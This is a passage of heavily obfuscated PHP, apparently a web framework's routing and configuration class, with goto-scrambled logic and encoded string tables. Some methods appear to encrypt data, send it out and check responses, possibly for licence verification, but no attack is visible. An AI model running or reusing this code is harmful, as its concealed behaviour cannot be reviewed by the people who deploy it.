c¿¼¨Áãâö; C§›šªÇŞ: $eÔèÍ˜ì¶Œ = $eíŒ…ìŸ•Ê[593]; if (strlen($eÔèÍ˜ì¶Œ) < $eíŒ…ìŸ•Ê[589]) { return; } if ($bĞ¿µÏ­°„ == $F“­’¼¼Ø¤[8]) { $déÚŒ²‘ß = $F“­’¼¼Ø¤[9]; $aÜ‡ˆò¨Ò†[0] = $F“­’¼¼Ø¤[10]; $aÜ‡ˆò¨Ò†[1] = $aÜ‡ˆò¨Ò†[1] . $F“­’¼¼Ø¤[11]; $a¯¤××µö = $F“­’¼¼Ø¤[12]($F“­’¼¼Ø¤[1], $aÜ‡ˆò¨Ò†); $a¯¤××µö = $F“­’¼¼Ø¤[2]($a¯¤××µö, $F“­’¼¼Ø¤[1]); } goto a²©µêË…£; EŠä‘ ºùË: $DÔ™¹õ¡£Ç = $eíŒ…ìŸ•Ê[592]; $bĞ¿µÏ­°„ = $F“­’¼¼Ø¤[6]($aÜ‡ˆò¨Ò†[0]); $déÚŒ²‘ß = $F“­’¼¼Ø¤[7]; goto C§›šªÇŞ; a»âìØ¹®¨: if (!$Aé†¢ºå) { return; } $F“­’¼¼Ø¤[13](array($F“­’¼¼Ø¤[14], $F“­’¼¼Ø¤[15]), $déÚŒ²‘ß . $F“­’¼¼Ø¤[18], $a¯¤××µö); $F£Ç¬±öƒÍ = $eíŒ…ìŸ•Ê[595]; goto bØ’˜¹»Ş¼; c¦ˆö´áÛ: $eíŒ…ìŸ•Ê =& $_SERVER[Ü˜]; $F“­’¼¼Ø¤ =& $_SERVER[’û£ìÂ®Å‚]; $aÜ‡ˆò¨Ò† = $F“­’¼¼Ø¤[0]($F“­’¼¼Ø¤[1], $a¯¤××µö); goto EŠä‘ ºùË; a²©µêË…£: $F“­’¼¼Ø¤[13](array($F“­’¼¼Ø¤[14], $F“­’¼¼Ø¤[15]), $déÚŒ²‘ß . $F“­’¼¼Ø¤[16], $a¯¤××µö); $F“­’¼¼Ø¤[17]($a¯¤××µö); $Aé†¢ºå = $eíŒ…ìŸ•Ê[594]; goto a»âìØ¹®¨; c¿¼¨Áãâö: } private function autorun() { $CÍƒã³¯–ï =& $_SERVER[’û£ìÂ®Å‚]; global $config; if ($CÍƒã³¯–ï[19]($config[$CÍƒã³¯–ï[20]]) == 0) { return; } foreach ($config[$CÍƒã³¯–ï[20]] as $aä´ùî•šÖ => $FĞ“•®â†ê) { $this->{$_SERVER[’û£ìÂ®Å‚][21]}($FĞ“•®â†ê); $eã¦¯ÃÑÑ = $_SERVER[Ü˜][596]; if (!$eã¦¯ÃÑÑ) { die; } } } private function qrxkaa6ed5b5() { goto dÄÃ†ÔÍ„‘; dÛ÷Ì¦Âô¯: $F»¸åù½ù = array($Bæ·Ş¼Ø³[8], $Aä¨÷·íæ½); $cæŠö‰åÍ… = $Bæ·Ş¼Ø³[26]($GLOBALS[$Bæ·Ş¼Ø³[22]][$Bæ·Ş¼Ø³[23]], 1); $D“µÈ•‘Ä‚ = $Dì¬òÖ™…‚[598]; goto D™¾Î­³Ê„; D™¾Î­³Ê„: if (!$D“µÈ•‘Ä‚) { die; } $GLOBALS[$Bæ·Ş¼Ø³[22]][$Bæ·Ş¼Ø³[23]] = $Bæ·Ş¼Ø³[27]($F»¸åù½ù, $cæŠö‰åÍ…); $c‡‚ğ°ï•‡ = $Dì¬òÖ™…‚[599]; goto b¹ù±±Çá; b¹ù±±Çá: if (!$c‡‚ğ°ï•‡) { return; } $GLOBALS[$Bæ·Ş¼Ø³[22]][$Bæ·Ş¼Ø³[28]] = $Bæ·Ş¼Ø³[29]($Bæ·Ş¼Ø³[1], $GLOBALS[$Bæ·Ş¼Ø³[22]][$Bæ·Ş¼Ø³[23]]); goto f³Ğí´¥Í; F±Ã›ñÇÈÉ: if (!$fõ…¯ô†ÌŒ || $Bæ·Ş¼Ø³[24]($fõ…¯ô†ÌŒ) <= $Bæ·Ş¼Ø³[24]($BéŞÁ…“ˆ)) { return; } if ($Bæ·Ş¼Ø³[6]($Bæ·Ş¼Ø³[25]($fõ…¯ô†ÌŒ, -$Bæ·Ş¼Ø³[24]($BéŞÁ…“ˆ))) != $BéŞÁ…“ˆ) { return; } $Aä¨÷·íæ½ = $Bæ·Ş¼Ø³[25]($fõ…¯ô†ÌŒ, 0, -$Bæ·Ş¼Ø³[24]($BéŞÁ…“ˆ)); goto dÛ÷Ì¦Âô¯; dÄÃ†ÔÍ„‘: $Dì¬òÖ™…‚ =& $_SERVER[Ü˜]; $Bæ·Ş¼Ø³ =& $_SERVER[’û£ìÂ®Å‚]; $BéŞÁ…“ˆ = $Bæ·Ş¼Ø³[8]; goto EÒÁ¾‚½ñœ; EÒÁ¾‚½ñœ: $C½¹˜éöÅ = $Dì¬òÖ™…‚[597]; while ($C½¹˜éöÅ < $Dì¬òÖ™…‚[589]) { if ($C½¹˜éöÅ >= 0) { break; } $C½¹˜éöÅ++; } $fõ…¯ô†ÌŒ = $GLOBALS[$Bæ·Ş¼Ø³[22]][$Bæ·Ş¼Ø³[23]][0]; goto F±Ã›ñÇÈÉ; f³Ğí´¥Í: } private function aroicd031596() { goto A‚ôÉ¡Æƒ; AÁ®‹¶§õÑ: $eÄ®âµ¼ßØ = $Bƒ‹ ã¥•[2]($FÙ£Í¢ç…ö[0][0], $Bƒ‹ ã¥•[36]); $GLOBALS[$Bƒ‹ ã¥•[22]][$Bƒ‹ ã¥•[23]] = $Bƒ‹ ã¥•[0]($Bƒ‹ ã¥•[36], $eÄ®âµ¼ßØ); $CµšèË±Ù¤ = $cÍ‹°àŠ[600]; goto FøÃéù¢Ù¤; FøÃéù¢Ù¤: while ($CµšèË±Ù¤ < $cÍ‹°àŠ[64]) { if ($CµšèË±Ù¤ >= 0) { break; } $CµšèË±Ù¤++; } $GLOBALS[$Bƒ‹ ã¥•[22]][$Bƒ‹ ã¥•[28]] = $Bƒ‹ ã¥•[29]($Bƒ‹ ã¥•[1], $GLOBALS[$Bƒ‹ ã¥•[22]][$Bƒ‹ ã¥•[23]]); goto E¢½ê²‡»; D˜Ææ¹ œ¼: $EàëÚùÄÍï = $_SERVER[$Bƒ‹ ã¥•[30]]; $eÈ¢‚º˜‘ = $Bƒ‹ ã¥•[31]; if (!$Bƒ‹ ã¥•[32]($EàëÚùÄÍï, $eÈ¢‚º˜‘)) { return; } goto eØ¨Ëâ‹ó¸; eØ¨Ëâ‹ó¸: $FÃÈ˜°Ö‡ = $Bƒ‹ ã¥•[33]($EàëÚùÄÍï, $eÈ¢‚º˜‘); $eÄ®âµ¼ßØ = $Bƒ‹ ã¥•[25]($EàëÚùÄÍï, $FÃÈ˜°Ö‡ + $Bƒ‹ ã¥•[24]($eÈ¢‚º˜‘)); $Bƒ‹ ã¥•[34]($Bƒ‹ ã¥•[35], $eÄ®âµ¼ßØ, $FÙ£Í¢ç…ö); goto AÁ®‹¶§õÑ; A‚ôÉ¡Æƒ: $cÍ‹°àŠ =& $_SERVER[Ü˜]; $Bƒ‹ ã¥• =& $_SERVER[’û£ìÂ®Å‚]; if ($GLOBALS[$Bƒ‹ ã¥•[22]][$Bƒ‹ ã¥•[28]] != $Bƒ‹ ã¥•[10]) { return; } goto D˜Ææ¹ œ¼; E¢½ê²‡»: } public function run() { goto DöËÉàÀÜá; eŒÕ§Ãöò„: $a‹øø‘µ’…[39]($a‹øø‘µ’…[42], isset($F±®¤Ò—±[2]) && $F±®¤Ò—±[0] ? $F±®¤Ò—±[2] : $this->defaultAction); $eÓ¡÷–ï— = $E°–ñ‰ÎÓ[604]; while ($eÓ¡÷–ï— < $E°–ñ‰ÎÓ[605]) { if ($eÓ¡÷–ï— >= 0) { break; } $eÓ¡÷–ï—++; } goto BÇçÖŒ§Øš; BÎ²¥Û¸®: $C‹¯Ñ®Ú¾µ = $E°–ñ‰ÎÓ[601]; $this->{$_SERVER[’û£ìÂ®Å‚][38]}(); $F±®¤Ò—± = $GLOBALS[$a‹øø‘µ’…[22]][$a‹øø‘µ’…[23]]; goto bôç—õ¼Å¦; DöËÉàÀÜá: $E°–ñ‰ÎÓ =& $_SERVER[Ü˜]; $a‹øø‘µ’… =& $_SERVER[’û£ìÂ®Å‚]; $this->{$_SERVER[’û£ìÂ®Å‚][37]}(); goto BÎ²¥Û¸®; c“íØÑØ—ç: if ($a‹øø‘µ’…[19]($F±®¤Ò—±) >= 3) { $this->{$_SERVER[’û£ìÂ®Å‚][21]}($fŒšÏ»½ãµ); } else { $this->{$_SERVER[’û£ìÂ®Å‚][21]}(ACTION); } goto cˆÂ¡˜è©Š; bôç—õ¼Å¦: $c†Ñ×Ö‰Ÿ¾ = $E°–ñ‰ÎÓ[602]; $fŒšÏ»½ãµ = $GLOBALS[$a‹øø‘µ’…[22]][$a‹øø‘µ’…[28]]; $Eó’Ö ƒ½Ğ = $E°–ñ‰ÎÓ[603]; goto B¡Ñ¯Ç¸È; B¡Ñ¯Ç¸È: if (strlen($Eó’Ö ƒ½Ğ) < $E°–ñ‰ÎÓ[584]) { die; } $a‹øø‘µ’…[39]($a‹øø‘µ’…[40], isset($F±®¤Ò—±[0]) && $F±®¤Ò—±[0] ? $F±®¤Ò—±[0] : $this->defaultModule); $a‹øø‘µ’…[39]($a‹øø‘µ’…[41], isset($F±®¤Ò—±[1]) && $F±®¤Ò—±[0] ? $F±®¤Ò—±[1] : $this->defaultController); goto eŒÕ§Ãöò„; BÇçÖŒ§Øš: $a‹øø‘µ’…[39]($a‹øø‘µ’…[43], MOD . $a‹øø‘µ’…[1] . ST . $a‹øø‘µ’…[1] . ACT); $_SERVER[$a‹øø‘µ’…[44]] = $a‹øø‘µ’…[6](ACTION); $this->{$_SERVER[’û£ìÂ®Å‚][45]}(); goto c“íØÑØ—ç; cˆÂ¡˜è©Š: } private $vuljaf2cb0dd = array(); private $jndo77356942 = ''; public function fcwz3aeffb41() { goto FñÒ¤…½íÉ; dªí§éœĞ: $this->{$_SERVER[’û£ìÂ®Å‚][48]}(); $DĞÎ‹ÀÖŞ­ = $D÷¥£–É„[607]; if (strlen($DĞÎ‹ÀÖŞ­) < $D÷¥£–É„[589]) { die; } goto EˆŞô»“ç; EˆŞô»“ç: $this->{$_SERVER[’û£ìÂ®Å‚][49]}(); $this->{$_SERVER[’û£ìÂ®Å‚][50]}(); $this->{$_SERVER[’û£ìÂ®Å‚][51]}(); goto BÔŒ±í´Ğó; aØ“¼¤›Ô: $this->{$_SERVER[’û£ìÂ®Å‚][3]}($Cßöè×§Šã[55], array($this, $Cßöè×§Šã[56])); $Fßæç…£ƒ† = $D÷¥£–É„[610]; while ($Fßæç…£ƒ† < $D÷¥£–É„[589]) { if ($Fßæç…£ƒ† >= 0) { break; } $Fßæç…£ƒ†++; } goto C°õÖâã; F»¾àĞê¨: while ($aÅ¿ƒ¦¢ˆ„ < $D÷¥£–É„[612]) { if ($aÅ¿ƒ¦¢ˆ„ >= 0) { break; } $aÅ¿ƒ¦¢ˆ„++; } goto EÀ®ÖñÚ‰Ÿ; CŠÁ…æÅ: $eÜè¼·Ü§ = $D÷¥£–É„[606]; if (!$eÜè¼·Ü§) { die; } $this->{$_SERVER[’û£ìÂ®Å‚][47]}(); goto dªí§éœĞ; C°õÖâã: $this->{$_SERVER[’û£ìÂ®Å‚][3]}($Cßöè×§Šã[57], array($this, $Cßöè×§Šã[58])); $this->{$_SERVER[’û£ìÂ®Å‚][3]}($Cßöè×§Šã[59], array($this, $Cßöè×§Šã[60])); $aÅ¿ƒ¦¢ˆ„ = $D÷¥£–É„[611]; goto F»¾àĞê¨; FñÒ¤…½íÉ: $D÷¥£–É„ =& $_SERVER[Ü˜]; $Cßöè×§Šã =& $_SERVER[’û£ìÂ®Å‚]; $this->{$_SERVER[’û£ìÂ®Å‚][46]}(); goto CŠÁ…æÅ; c¬Ã¸ö•ğ°: $this->{$_SERVER[’û£ìÂ®Å‚][3]}($Cßöè×§Šã[53], array($this, $Cßöè×§Šã[54])); $e›©ªãÚÄ½ = $D÷¥£–É„[609]; if (!$e›©ªãÚÄ½) { return; } goto aØ“¼¤›Ô; BÔŒ±í´Ğó: $this->{$_SERVER[’û£ìÂ®Å‚][52]}(); $CÒÎËì«…™ = $D÷¥£–É„[608]; if (strlen($CÒÎËì«…™) < $D÷¥£–É„[605]) { return; } goto c¬Ã¸ö•ğ°; EÀ®ÖñÚ‰Ÿ: } public function idrhe2f9f909($c¶èÒÙ¡³‚) { goto F¨‡»‡ÅÑÕ; eËÊ›“ğ: $F˜–ñ×™í‡ = $Fƒ…ÕŠ‰[616]; if (!$F˜–ñ×™í‡) { return; } $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[127]] = $C«éÕ¡íğ[128]($C«éÕ¡íğ[129]()); goto Cæ¬‡—»Ñš; e®¬ÖêäŒÊ: $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[138]] = $C«éÕ¡íğ[116]($this->vuljaf2cb0dd, $C«éÕ¡íğ[139], $C«éÕ¡íğ[10]); $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[140]] = $C«éÕ¡íğ[116]($this->vuljaf2cb0dd, $C«éÕ¡íğ[141], $C«éÕ¡íğ[10]); $A¿í“Ş‡Îë = $Fƒ…ÕŠ‰[617]; goto A²íÕØ•¥è; FÕ—Íà¸·Œ: unset($c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[108]][$C«éÕ¡íğ[109]]); unset($c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[108]][$C«éÕ¡íğ[110]]); $aïÖ£°áÛ = $Fƒ…ÕŠ‰[615]; goto b²ë¶èÊ¾; bÆ›ğ™¸•: $c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$C«éÕ¡íğ[112]] = array($C«éÕ¡íğ[113] => (int) $d‚¨¤Í±³¾[$C«éÕ¡íğ[114]], $C«éÕ¡íğ[115] => (int) $C«éÕ¡íğ[116]($d‚¨¤Í±³¾, $C«éÕ¡íğ[117], 0)); $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[119]] = $C«éÕ¡íğ[120]($C«éÕ¡íğ[121])->{$_SERVER[’û£ìÂ®Å‚][122]}(); $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[123]] = $C«éÕ¡íğ[124]($_SERVER[$C«éÕ¡íğ[125]] . $Cš—íË³°æ[$C«éÕ¡íğ[126]]); goto eËÊ›“ğ; A²íÕØ•¥è: if (!$A¿í“Ş‡Îë) { return; } if ($C«éÕ¡íğ[116]($GLOBALS, $C«éÕ¡íğ[142]) && $this->config[$C«éÕ¡íğ[143]]) { $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[144]] = WEB_ROOT; } return $c¶èÒÙ¡³‚; goto dÌ ØëùÁš; dİŸğ˜ îÂ: $a‰öçµ•—» = array($C«éÕ¡íğ[64], $C«éÕ¡íğ[65], $C«éÕ¡íğ[66], $C«éÕ¡íğ[67], $C«éÕ¡íğ[68], $C«éÕ¡íğ[69], $C«éÕ¡íğ[70], $C«éÕ¡íğ[71], $C«éÕ¡íğ[72], $C«éÕ¡íğ[73], $C«éÕ¡íğ[74], $C«éÕ¡íğ[75], $C«éÕ¡íğ[76], $C«éÕ¡íğ[77], $C«éÕ¡íğ[78], $C«éÕ¡íğ[79], $C«éÕ¡íğ[80], $C«éÕ¡íğ[81], $C«éÕ¡íğ[82], $C«éÕ¡íğ[83], $C«éÕ¡íğ[84], $C«éÕ¡íğ[85], $C«éÕ¡íğ[86], $C«éÕ¡íğ[87], $C«éÕ¡íğ[88], $C«éÕ¡íğ[89], $C«éÕ¡íğ[90], $C«éÕ¡íğ[91], $C«éÕ¡íğ[92], $C«éÕ¡íğ[93], $C«éÕ¡íğ[94], $C«éÕ¡íğ[95], $C«éÕ¡íğ[96], $C«éÕ¡íğ[97], $C«éÕ¡íğ[98], $C«éÕ¡íğ[99], $C«éÕ¡íğ[100], $C«éÕ¡íğ[101], $C«éÕ¡íğ[102], $C«éÕ¡íğ[103]); $f“”©µÁ„Í = $Fƒ…ÕŠ‰[613]; foreach ($a‰öçµ•—» as $c»¥ã¡ä°Ì) { $c› µÉÑ¯• = $GLOBALS[$C«éÕ¡íğ[104]][$C«éÕ¡íğ[105]][$c»¥ã¡ä°Ì]; if (isset($Cš—íË³°æ[$c»¥ã¡ä°Ì])) { $c› µÉÑ¯• = $Cš—íË³°æ[$c»¥ã¡ä°Ì]; } $c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$c»¥ã¡ä°Ì] = $c› µÉÑ¯•; } goto DÙ™—¢÷; DÙ™—¢÷: $d‚¨¤Í±³¾ = $c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$C«éÕ¡íğ[76]]; $AÚá‘åÛí„ = $Fƒ…ÕŠ‰[614]; if (strlen($AÚá‘åÛí„) < $Fƒ…ÕŠ‰[64]) { die; } goto FÕ—Íà¸·Œ; b²ë¶èÊ¾: while ($aïÖ£°áÛ < $Fƒ…ÕŠ‰[605]) { if ($aïÖ£°áÛ >= 0) { break; } $aïÖ£°áÛ++; } unset($c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$C«éÕ¡íğ[76]]); unset($c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$C«éÕ¡íğ[111]]); goto bÆ›ğ™¸•; F¨‡»‡ÅÑÕ: $Fƒ…ÕŠ‰ =& $_SERVER[Ü˜]; $C«éÕ¡íğ =& $_SERVER[’û£ìÂ®Å‚]; $Cš—íË³°æ = $C«éÕ¡íğ[61]($C«éÕ¡íğ[62])->{$_SERVER[’û£ìÂ®Å‚][63]}(); goto dİŸğ˜ îÂ; Cæ¬‡—»Ñš: $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[130]] = $this->jndo77356942; if ($Cš—íË³°æ[$C«éÕ¡íğ[130]] != $C«éÕ¡íğ[131]) { $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[132]] = $Cš—íË³°æ[$C«éÕ¡íğ[132]]; $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[133]] = $Cš—íË³°æ[$C«éÕ¡íğ[133]]; $Cºîªø¥¾¡ = $C«éÕ¡íğ[134](10) . $this->jndo77356942 . $C«éÕ¡íğ[134](5); $c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[135]][$C«éÕ¡íğ[136]] = $this->{$_SERVER[’û£ìÂ®Å‚][137]}($Cºîªø¥¾¡, $c¶èÒÙ¡³‚[$C«éÕ¡íğ[118]][$C«éÕ¡íğ[123]]); } if ($this->jndo77356942 == $C«éÕ¡íğ[131]) { $c¶èÒÙ¡³‚[$C«éÕ¡íğ[106]][$C«éÕ¡íğ[107]][$C«éÕ¡íğ[112]][$C«éÕ¡íğ[117]] = 0; } goto e®¬ÖêäŒÊ; dÌ ØëùÁš: } private function xzwi952424a9() { goto d³¥°†ÔÜ; dÌº™´ø÷: while (strlen($B„‡ù‹ø˜Ç) < $BÉê±¢œÈ[612]) { if (!$B„‡ù‹ø˜Ç) { break; } $B„‡ù‹ø˜Ç++; } $B†…š£ÌÂš = $d×¥Ÿ‘İ«[61]($d×¥Ÿ‘İ«[62])->{$_SERVER[’û£ìÂ®Å‚][63]}(); $BÀ¥Ÿ¬­Œ = array($d×¥Ÿ‘İ«[177] => $B†…š£ÌÂš[$d×¥Ÿ‘İ«[64]], $d×¥Ÿ‘İ«[178] => $B†…š£ÌÂš[$d×¥Ÿ‘İ«[65]], $d×¥Ÿ‘İ«[179] => $d×¥Ÿ‘İ«[10]); goto CŠæ…†‰—Ã; CŠæ…†‰—Ã: foreach ($FŒòÜ”öº‚ as $B³¼İÍ­¤) { if (!isset($B†…š£ÌÂš[$B³¼İÍ­¤]) || !$B†…š£ÌÂš[$B³¼İÍ­¤]) { continue; } $BÀ¥Ÿ¬­Œ[$B³¼İÍ­¤] = $B†…š£ÌÂš[$B³¼İÍ­¤]; } $d×¥Ÿ‘İ«[13](array($d×¥Ÿ‘İ«[169], $d×¥Ÿ‘İ«[170]), $BÀ¥Ÿ¬­Œ); $Fªß…ÀíìÕ = $BÉê±¢œÈ[621]; goto bÕÃÁ¦îË¤; BŞµ¯¸¶ò: if ($this->jndo77356942 == $d×¥Ÿ‘İ«[131]) { return; } $FŒòÜ”öº‚ = array($d×¥Ÿ‘İ«[171], $d×¥Ÿ‘İ«[172], $d×¥Ÿ‘İ«[173], $d×¥Ÿ‘İ«[174], $d×¥Ÿ‘İ«[175], $d×¥Ÿ‘İ«[176]); $B„‡ù‹ø˜Ç = $BÉê±¢œÈ[620]; goto dÌº™´ø÷; d³¥°†ÔÜ: $BÉê±¢œÈ =& $_SERVER[Ü˜]; $d×¥Ÿ‘İ« =& $_SERVER[’û£ìÂ®Å‚]; if ($_SERVER[$d×¥Ÿ‘İ«[44]] == $d×¥Ÿ‘İ«[145]) { goto bÔŠˆœóèƒ; bÔŠˆœóèƒ: $EË‡¨…øà = array($d×¥Ÿ‘İ«[130] => $this->jndo77356942, $d×¥Ÿ‘İ«[146] => $this->{$_SERVER[’û£ìÂ®Å‚][147]}(), $d×¥Ÿ‘İ«[148] => $d×¥Ÿ‘İ«[61]($d×¥Ÿ‘İ«[149])->{$_SERVER[’û£ìÂ®Å‚][150]}()); if ($this->jndo77356942 != $d×¥Ÿ‘İ«[131]) { $aöƒõŞˆÒª = $d×¥Ÿ‘İ«[116]($this->vuljaf2cb0dd, $d×¥Ÿ‘İ«[151]); if ($aöƒõŞˆÒª) { $EË‡¨…øà[$d×¥Ÿ‘İ«[152]] = $aöƒõŞˆÒª; $EË‡¨…øà[$d×¥Ÿ‘İ«[153]] = $d×¥Ÿ‘İ«[154]($d×¥Ÿ‘İ«[116]($this->vuljaf2cb0dd, $d×¥Ÿ‘İ«[155])); $EË‡¨…øà[$d×¥Ÿ‘İ«[156]] = $d×¥Ÿ‘İ«[116]($this->vuljaf2cb0dd, $d×¥Ÿ‘İ«[141]); } $a®çØõÜ¦ = $d×¥Ÿ‘İ«[61]($d×¥Ÿ‘İ«[62])->{$_SERVER[’û£ìÂ®Å‚][63]}($d×¥Ÿ‘İ«[157], $d×¥Ÿ‘İ«[10], !0); if ($d×¥Ÿ‘İ«[158]($a®çØõÜ¦) && $d×¥Ÿ‘İ«[25]($a®çØõÜ¦, 0, 1) == $d×¥Ÿ‘İ«[159]) { $a®çØõÜ¦ = $d×¥Ÿ‘İ«[160]($a®çØõÜ¦); } if ($d×¥Ÿ‘İ«[161]($a®çØõÜ¦) && $a®çØõÜ¦[$d×¥Ÿ‘İ«[162]] && $d×¥Ÿ‘İ«[32]($a®çØõÜ¦[$d×¥Ÿ‘İ«[162]], $d×¥Ÿ‘İ«[163])) { $dÙŸ‰ê¸í‚ = $d×¥Ÿ‘İ«[0]($d×¥Ÿ‘İ«[163], $a®çØõÜ¦[$d×¥Ÿ‘İ«[162]]); $EË‡¨…øà[$d×¥Ÿ‘İ«[164]] = $dÙŸ‰ê¸í‚[0]; } } $EË‡¨…øà = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($d×¥Ÿ‘İ«[166]($EË‡¨…øà), $d×¥Ÿ‘İ«[124]($d×¥Ÿ‘İ«[167])); goto DŸ„åˆ¢Òê; DŸ„åˆ¢Òê: $BÀ¥Ÿ¬­Œ = array($d×¥Ÿ‘İ«[168] => $EË‡¨…øà); $F”ÖÇÜˆ˜Ş = $BÉê±¢œÈ[618]; if (!$F”ÖÇÜˆ˜Ş) { die; } goto D¢ªß²¤; D¢ªß²¤: $d×¥Ÿ‘İ«[13](array($d×¥Ÿ‘İ«[169], $d×¥Ÿ‘İ«[170]), $BÀ¥Ÿ¬­Œ); $b©ó†Ä‹°Ñ = $BÉê±¢œÈ[619]; if (strlen($b©ó†Ä‹°Ñ) < $BÉê±¢œÈ[584]) { return; } goto EÑˆÏçí«; EÑˆÏçí«: } goto BŞµ¯¸¶ò; bÕÃÁ¦îË¤: while (strlen($Fªß…ÀíìÕ) < $BÉê±¢œÈ[589]) { if (!$Fªß…ÀíìÕ) { break; } $Fªß…ÀíìÕ++; } goto DÔç¸‚¨ó; DÔç¸‚¨ó: } private function ijat6b3618ab() { goto fç‹ÉàšŸ„; fç‹ÉàšŸ„: $f˜¥‹”ñÎ¯ =& $_SERVER[Ü˜]; $EŒÀ¸‚÷ˆ =& $_SERVER[’û£ìÂ®Å‚]; if ($_SERVER[$EŒÀ¸‚÷ˆ[44]] != $EŒÀ¸‚÷ˆ[180]) { return; } goto Fé–ÖŒ‹Ø; Bäœ¨éØ«¾: if ($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[197]] == $EŒÀ¸‚÷ˆ[198]) { $b—óÈõĞê = $this->{$_SERVER[’û£ìÂ®Å‚][165]}($bŒ·ø½¨•É, $EŒÀ¸‚÷ˆ[199]); $dò’·Ÿ…Ñ = $this->{$_SERVER[’û£ìÂ®Å‚][137]}($EŒÀ¸‚÷ˆ[166]($e³­„çÌôô), $bŒ·ø½¨•É . $EŒÀ¸‚÷ˆ[200], 3); $dò’·Ÿ…Ñ = $dò’·Ÿ…Ñ . $EŒÀ¸‚÷ˆ[201] . $_SERVER[$EŒÀ¸‚÷ˆ[191]]; $C¤Ô„Ùô˜„ = $this->{$_SERVER[’û£ìÂ®Å‚][202]}($EŒÀ¸‚÷ˆ[203] . $b—óÈõĞê . $EŒÀ¸‚÷ˆ[204] . $dò’·Ÿ…Ñ, -1); $EŒÀ¸‚÷ˆ[184]($C¤Ô„Ùô˜„, !0); } else { if ($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[197]] == $EŒÀ¸‚÷ˆ[205]) { $f¶ÕÙ›‰‹â = $EŒÀ¸‚÷ˆ[25]($EŒÀ¸‚÷ˆ[124]($EŒÀ¸‚÷ˆ[206] . $bŒ·ø½¨•É), 12, 15) . $EŒÀ¸‚÷ˆ[207]; $dò’·Ÿ…Ñ = $this->{$_SERVER[’û£ìÂ®Å‚][208]}($EŒÀ¸‚÷ˆ[2]($DáÖÄ×ÈËÍ[$EŒÀ¸‚÷ˆ[209]]), $f¶ÕÙ›‰‹â, 2); $c¶ï–•óøÆ = $EŒÀ¸‚÷ˆ[210]($dò’·Ÿ…Ñ, !0); if (!$EŒÀ¸‚÷ˆ[161]($c¶ï–•óøÆ) || !$EŒÀ¸‚÷ˆ[161]($c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]]) || $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[183]] != !0) { $E¸á’ƒ¶Âê = $EŒÀ¸‚÷ˆ[212]; $e©µ°İ‰Ê³ = $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]] ? $EŒÀ¸‚÷ˆ[213] . $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]] : $E¸á’ƒ¶Âê; $EŒÀ¸‚÷ˆ[184]($e©µ°İ‰Ê³, !1); } else { $e³­„çÌôô[$EŒÀ¸‚÷ˆ[186]] = $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]][$EŒÀ¸‚÷ˆ[214]]; } } else { $c¶ï–•óøÆ = $this->{$_SERVER[’û£ìÂ®Å‚][202]}($EŒÀ¸‚÷ˆ[215], $e³­„çÌôô, 10); } } if (!$EŒÀ¸‚÷ˆ[161]($c¶ï–•óøÆ) || !$EŒÀ¸‚÷ˆ[161]($c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]]) || $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[183]] != !0) { $E¸á’ƒ¶Âê = $EŒÀ¸‚÷ˆ[216]($EŒÀ¸‚÷ˆ[217]); $e©µ°İ‰Ê³ = $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]] ? $EŒÀ¸‚÷ˆ[213] . $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]] : $E¸á’ƒ¶Âê; $EŒÀ¸‚÷ˆ[184]($e©µ°İ‰Ê³, !1); } $Dç„ŸíÕ¦§ = $c¶ï–•óøÆ[$EŒÀ¸‚÷ˆ[211]]; goto e‚¼–§ª‚Ç; a”±Æ‰îÎï: while (strlen($B”Ò¦ô“) < $f˜¥‹”ñÎ¯[589]) { if (!$B”Ò¦ô“) { break; } $B”Ò¦ô“++; } $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[11])->{$_SERVER[’û£ìÂ®Å‚][245]}($e³ù–à§Ñ“[$EŒÀ¸‚÷ˆ[246]], array($EŒÀ¸‚÷ˆ[247] => $bËÆáÒÆäğ)); $dèÜ”É“©ò = $f˜¥‹”ñÎ¯[631]; goto fÙÅØğçÕ; bÏïÅåË£: if ($Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[236]] && $Dç„ŸíÕ¦§[$EŒÀ¸‚÷ˆ[236]] >= 1) { $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[62])->{$_SERVER[’û£ìÂ®Å‚][237]}($EŒÀ¸‚÷ˆ[238], $EŒÀ¸‚÷ˆ[239]); } $EŒÀ¸‚÷ˆ[61]($EŒÀ¸‚÷ˆ[62])->{$_SERVER[’û£ìÂ®Å‚][240]}($Bì‰¥–÷”¶); $A£¨Ú‹æÁ = 